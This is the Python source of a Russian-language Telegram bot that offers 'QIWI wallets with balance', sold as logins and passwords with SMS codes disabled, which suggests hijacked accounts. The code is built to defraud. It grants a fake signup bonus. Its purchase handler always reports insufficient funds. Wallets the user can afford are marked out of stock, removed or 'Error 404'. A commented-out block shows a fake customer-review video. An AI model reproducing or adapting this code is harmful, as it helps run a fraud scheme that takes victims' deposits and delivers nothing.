from aiogram import types
from misc import dp, bot
from .sqlit import channeg_status,cheak_money,channeg_money,progrev
import asyncio

progrev1 = 20
otziv1 = 'BAACAgIAAxkBAAEBTZ9gwN-oV9z5RQE33IadEDYocRueFAAC7Q0AAm2FAUoSVns58u1wMR8E' #Видео отзыв

bonus = 2000 #Бонусные рубли

Q1 = [490 + bonus,1260 + bonus]
Q2 = [980 + bonus, 2330 + bonus]
Q3 = [1450 + bonus,3130 + bonus]
Q4 = [4750 + bonus, 13870 + bonus]

@dp.callback_query_handler(text_startswith='check')  # Нажал кнопку Я ПОДПИСАЛСЯ. ДЕЛАЕМ ПРОВЕРКУ
async def check(call: types.callback_query):
    await bot.send_message(call.message.chat.id, '⏳ Ожидайте. Идёт проверка подписки.')
    proverka1 = (await bot.get_chat_member(chat_id='@QiwiWalet_info', user_id=call.message.chat.id)).status
    if proverka1 == 'administrator' or proverka1 == 'member' or proverka1 == 'creator':
        await bot.send_message(call.message.chat.id, 'Доступ открыт. Напиши мне /start что бы продолжить работу и получить <b>2000 Pуб</b>',parse_mode='html')
        channeg_status(call.message.chat.id)
        mon = cheak_money(call.message.chat.id)
        if int(mon) <2000:
            channeg_money(call.message.chat.id,2000)
    else:
        await bot.send_message(call.message.chat.id, 'Доступ закрыт. Повторите попытку')


@dp.callback_query_handler(text='profile')  # Нажал кнопку Профиль
async def profile(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='💰 Кошельки', callback_data='walled')
    bat_b = types.InlineKeyboardButton(text='💎 Пополнить баланс', callback_data='pay_money')
    bat_c = types.InlineKeyboardButton(text='👥 Профиль', callback_data='profile')
    bat_d = types.InlineKeyboardButton(text='ℹ Информация', callback_data='info')
    markup.add(bat_a, bat_b)
    markup.row(bat_c, bat_d)
    money = cheak_money(call.message.chat.id)
    if 'Профиль' in call.message.text:
        pass
    else:
        await bot.edit_message_text(message_id=call.message.message_id,chat_id=call.message.chat.id, text='🧾 Профиль\n\n'
                                                                                                      f'🆔Ваш id- {call.message.chat.id}\n'
                                                                                                      f'💰Ваш баланс - {money} рублей'
                                                                                                      f'',reply_markup=markup)

@dp.callback_query_handler(text='walled')  # Нажал кнопку Кошельки
async def walled(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text=f'🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб', callback_data='qiwi_4')
    bat_b = types.InlineKeyboardButton(text=f'🥈 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб', callback_data='qiwi_3')
    bat_c = types.InlineKeyboardButton(text=f'🥉 QIWI с балансом {Q2[1]} руб | {Q2[0]} руб', callback_data='qiwi_2')
    bat_d = types.InlineKeyboardButton(text=f'⭐ QIWI с балансом {Q1[1]} руб | {Q1[0]} руб', callback_data='qiwi_1')
    bat_e = types.InlineKeyboardButton(text='НАЗАД', callback_data='walled_exit')
    markup.add(bat_a)
    markup.add(bat_b)
    markup.add(bat_c)
    markup.add(bat_d)
    markup.add(bat_e)
    await bot.edit_message_text(message_id=call.message.message_id,chat_id=call.message.chat.id,text='<b>❕ Выберите нужный товар:</b>',reply_markup=markup,parse_mode='html')

@dp.callback_query_handler(text='walled_exit')
async def walled_exit(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='💰 Кошельки', callback_data='walled')
    bat_b = types.InlineKeyboardButton(text='💎 Пополнить баланс', callback_data='pay_money')
    bat_c = types.InlineKeyboardButton(text='👥 Профиль', callback_data='profile')
    bat_d = types.InlineKeyboardButton(text='ℹ Информация', callback_data='info')
    markup.add(bat_a, bat_b)
    markup.row(bat_c, bat_d)
    await bot.edit_message_text(message_id=call.message.message_id,chat_id=call.message.chat.id,text= '😎 Добро пожаловать в нашего бота', reply_markup=markup)





@dp.callback_query_handler(text_startswith='qiwi') # Нажал на какой либо кошелек
async def qiwi_walled(call: types.callback_query):
    qiwi_number = int(call.data[5:])
    money = cheak_money(call.message.chat.id)


    if int(money) < Q1[0]:
        if qiwi_number == 1: #Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a,bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q1[1]} руб | {Q1[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q1[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q1[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q1[1] - Q1[0]} рублей\n'
                                             f'💠 Кол-во товара: 14',reply_markup=markup,parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q2[1]} руб | {Q2[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q2[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q2[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q2[1] - Q2[0]} рублей\n'
                                             f'💠 Кол-во товара: 16', reply_markup=markup, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q3[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q3[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q3[1] - Q3[0]} рублей\n'
                                             f'💠 Кол-во товара: 43', reply_markup=markup, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q4[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q4[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q4[1] - Q4[0]} рублей\n'
                                             f'💠 Кол-во товара: 4', reply_markup=markup, parse_mode='html')


    elif int(money) >= Q1[0] and int(money) < Q2[0] :
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url='https://t.me/QWSupport')
        markup1.add(bat_b)
        markup1.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q1[1]} руб | {Q1[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q1[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q1[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q1[1] - Q1[0]} рублей\n'
                                             f'💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')


        elif qiwi_number == 2:

            markup = types.InlineKeyboardMarkup()

            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')

            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')

            markup.add(bat_a, bat_b)

            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,

                                        text='Вы выбрали :\n'

                                             f'<b>🥇 QIWI с балансом {Q2[1]} руб | {Q2[0]} руб</b>\n\n'

                                             f'🔸 Qiwi кошелёк, цена: {Q2[0]} ₽.\n'

                                             f'💰 Баланс кошелька: {Q2[1]} руб\n\n'

                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'

                                             f'☑️Смс код выключен!\n\n'

                                             f'💠 Прибыль: {Q2[1] - Q2[0]} рублей\n'

                                             f'💠 Кол-во товара: 16', reply_markup=markup, parse_mode='html')


        elif qiwi_number == 3:

            markup = types.InlineKeyboardMarkup()

            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')

            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')

            markup.add(bat_a, bat_b)

            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,

                                        text='Вы выбрали :\n'

                                             f'<b>🥇 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб</b>\n\n'

                                             f'🔸 Qiwi кошелёк, цена: {Q3[0]} ₽.\n'

                                             f'💰 Баланс кошелька: {Q3[1]} руб\n\n'

                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'

                                             f'☑️Смс код выключен!\n\n'

                                             f'💠 Прибыль: {Q3[1] - Q3[0]} рублей\n'

                                             f'💠 Кол-во товара: 43', reply_markup=markup, parse_mode='html')


        else:

            markup = types.InlineKeyboardMarkup()

            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')

            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')

            markup.add(bat_a, bat_b)

            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,

                                        text='Вы выбрали :\n'

                                             f'<b>🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб</b>\n\n'

                                             f'🔸 Qiwi кошелёк, цена: {Q4[0]} ₽.\n'

                                             f'💰 Баланс кошелька: {Q4[1]} руб\n\n'

                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'

                                             f'☑️Смс код выключен!\n\n'

                                             f'💠 Прибыль: {Q4[1] - Q4[0]} рублей\n'

                                             f'💠 Кол-во товара: 4', reply_markup=markup, parse_mode='html')
        await asyncio.sleep(progrev1)
        if int(cheak_money(call.message.chat.id)) >= Q1[0] and int(cheak_money(call.message.chat.id)) < Q2[0]:
            if progrev(call.message.chat.id) == 1 :
                print('Отправляем отзыв')
                #await bot.send_video(chat_id=call.message.chat.id,video=otziv1,caption=f"""⚠️Внимание
#У нас закончились кошельки по {Q1[0]}₽. Вы можете выбрать другой тип кошелька💰
#
#Приносим свои извинения , выше вы можете посмотреть отзыв клиента который купил кошелек <b>с балансом : 3608₽</b>""",parse_mode='html')
# Пасс




    elif int(money) >= Q2[0] and int(money) < Q3[0]:
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        markup1.add(bat_b)

        markup2 = types.InlineKeyboardMarkup()
        bat_b2 = types.InlineKeyboardButton(text='🔚 ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url = 'https://t.me/QWSupport')
        markup2.add(bat_b2)
        markup2.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q1[1]} руб | {Q1[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q1[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q1[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q1[1] - Q1[0]} рублей\n'
                                             f'💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Данный кошелек убран из ассортимента\n'
                                             'Вы можете связаться с поддержкой и <b>вывести средства с бота</b> или выбрать другой тип кошелька', reply_markup=markup2, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'

                                             f'<b>🥇 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб</b>\n\n'

                                             f'🔸 Qiwi кошелёк, цена: {Q3[0]} ₽.\n'

                                             f'💰 Баланс кошелька: {Q3[1]} руб\n\n'

                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'

                                             f'☑️Смс код выключен!\n\n'

                                             f'💠 Прибыль: {Q3[1] - Q3[0]} рублей\n'

                                             f'💠 Кол-во товара: 21', reply_markup=markup, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q4[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q4[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q4[1] - Q4[0]} рублей\n'
                                             f'💠 Кол-во товара: 4', reply_markup=markup, parse_mode='html')


    elif int(money) >= Q3[0] and int(money) < Q4[0]:
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        markup1.add(bat_b)

        markup2 = types.InlineKeyboardMarkup()
        bat_b2 = types.InlineKeyboardButton(text='🔚 ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url = 'https://t.me/QWSupport')
        markup2.add(bat_b2)
        markup2.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q1[1]} руб | {Q1[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q1[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q1[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q1[1] - Q1[0]} рублей\n'
                                             f'💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Данный кошелек убран из ассортимента\n'
                                             'Вы можете связаться с поддержкой и вывести средства с бота или выбрать другой тип кошелька', reply_markup=markup2, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Ошибка 404. Свяжитесь с поддержкой что-бы они выдали киви кошелек вручную ', reply_markup=markup2, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q4[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q4[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q4[1] - Q4[0]} рублей\n'
                                             f'💠 Кол-во товара: 4', reply_markup=markup, parse_mode='html')
    elif int(money) >= Q4[0]:
        markup1 = types.InlineKeyboardMarkup()
        bat_b = types.InlineKeyboardButton(text='ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        markup1.add(bat_b)

        markup2 = types.InlineKeyboardMarkup()
        bat_b2 = types.InlineKeyboardButton(text='🔚 ВЫБРАТЬ ДРУГОЙ ТИП', callback_data='exit_qiwi')
        bat_support = types.InlineKeyboardButton(text='⚙️ПОДДЕРЖКА', url = 'https://t.me/QWSupport')
        markup2.add(bat_b2)
        markup2.add(bat_support)

        if qiwi_number == 1:  # Первый киви кошелек
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_1')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q1[1]} руб | {Q1[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q1[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q1[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q1[1] - Q1[0]} рублей\n'
                                             f'💠 Кол-во товара: Нет в наличии', reply_markup=markup1, parse_mode='html')

        elif qiwi_number == 2:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_2')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Данный кошелек убран из ассортимента\n'
                                             'Вы можете связаться с поддержкой и вывести средства с бота или выбрать другой тип кошелька', reply_markup=markup2, parse_mode='html')

        elif qiwi_number == 3:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_3')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Ошибка 404. Свяжитесь с поддержкой что-бы они выдали киви кошелек вручную ', reply_markup=markup2, parse_mode='html')

        else:
            markup = types.InlineKeyboardMarkup()
            bat_a = types.InlineKeyboardButton(text='Купить', callback_data='buy_qiwi_4')
            bat_b = types.InlineKeyboardButton(text='Выйти', callback_data='exit_qiwi')
            markup.add(bat_a, bat_b)
            await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        text='Вы выбрали :\n'
                                             f'<b>🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб</b>\n\n'
                                             f'🔸 Qiwi кошелёк, цена: {Q4[0]} ₽.\n'
                                             f'💰 Баланс кошелька: {Q4[1]} руб\n\n'
                                             f'▪При покупки кошелька, вы получаете: логин, пароль\n\n'
                                             f'☑️Смс код выключен!\n\n'
                                             f'💠 Прибыль: {Q4[1] - Q4[0]} рублей\n'
                                             f'💠 Кол-во товара: 4', reply_markup=markup, parse_mode='html')


@dp.callback_query_handler(text='exit_qiwi') # Нажал выйти после покупки
async def exit_qiwi(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text=f'🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб', callback_data='qiwi_4')
    bat_b = types.InlineKeyboardButton(text=f'🥈 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб', callback_data='qiwi_3')
    bat_c = types.InlineKeyboardButton(text=f'🥉 QIWI с балансом {Q2[1]} руб | {Q2[0]} руб', callback_data='qiwi_2')
    bat_d = types.InlineKeyboardButton(text=f'⭐ QIWI с балансом {Q1[1]} руб | {Q1[0]} руб', callback_data='qiwi_1')
    bat_e = types.InlineKeyboardButton(text='НАЗАД', callback_data='walled_exit')
    markup.add(bat_a)
    markup.add(bat_b)
    markup.add(bat_c)
    markup.add(bat_d)
    markup.add(bat_e)
    await bot.edit_message_text(message_id=call.message.message_id, chat_id=call.message.chat.id,
                                text='<b>❕ Выберите нужный товар:</b>', reply_markup=markup, parse_mode='html')


@dp.callback_query_handler(text_startswith='buy_qiwi') # Нажал Заплатить
async def bue_qiwi(call: types.callback_query):
    number = int(call.data[9:])
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text='ЗАПЛАТИТЬ', callback_data='ready')
    bat_b = types.InlineKeyboardButton(text='ОТМЕНА', callback_data='otmena')
    markup.add(bat_a,bat_b)
    if number == 4:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         f'🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб:\n\n'
                                         f'💠 Цена: {Q4[0]} рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)
    elif number == 3:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         f'🥈 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб:\n\n'
                                         f'💠 Цена: {Q3[0]} рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)

    elif number == 2:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         f'🥈 QIWI с балансом {Q2[1]} руб | {Q2[0]} руб:\n\n'
                                         f'💠 Цена: {Q2[0]} рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)
    else:
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    text='Вы выбрали:\n'
                                         f'⭐ QIWI с балансом {Q1[1]} руб | {Q1[0]} руб\n\n'
                                         f'💠 Цена: {Q1[0]} рублей\n'
                                         'Для подтверждения покупки, нажимай кнопку👇', reply_markup=markup)

@dp.callback_query_handler(text='ready')
async def ready(call: types.callback_query):
    money = cheak_money(call.message.chat.id)
    markup = types.InlineKeyboardMarkup()
    bat_b = types.InlineKeyboardButton(text='💎 Пополнить баланс', callback_data='pay_money')
    markup.add(bat_b)

    a = await bot.send_message(call.message.chat.id, '❌ Недостаточно средств\n'
                                                     f'<b>⭐ На вашем счете: {money} рублей</b>\n\n',parse_mode='html',reply_markup=markup)





@dp.callback_query_handler(text='otmena')
async def otmena(call: types.callback_query):
    markup = types.InlineKeyboardMarkup()
    bat_a = types.InlineKeyboardButton(text=f'🥇 QIWI с балансом {Q4[1]} руб | {Q4[0]} руб', callback_data='qiwi_4')
    bat_b = types.InlineKeyboardButton(text=f'🥈 QIWI с балансом {Q3[1]} руб | {Q3[0]} руб', callback_data='qiwi_3')
    bat_c = types.InlineKeyboardButton(text=f'🥉 QIWI с балансом {Q2[1]} руб | {Q2[0]} руб', callback_data='qiwi_2')
    bat_d = types.InlineKeyboardButton(text=f'⭐ QIWI с балансом {Q1[1]} руб | {Q1[0]} руб', callback_data='qiwi_1')
    bat_e = types.InlineKeyboardButton(text='НАЗАД', callback_data='walled_exit')
    markup.add(bat_a)
    markup.add(bat_b)
    markup.add(bat_c)
    markup.add(bat_d)
    markup.add(bat_e)
    await bot.edit_message_text(message_id=call.message.message_id, chat_id=call.message.chat.id,
                                text='<b>❕ Выберите нужный товар:</b>', reply_markup=markup, parse_mode='html')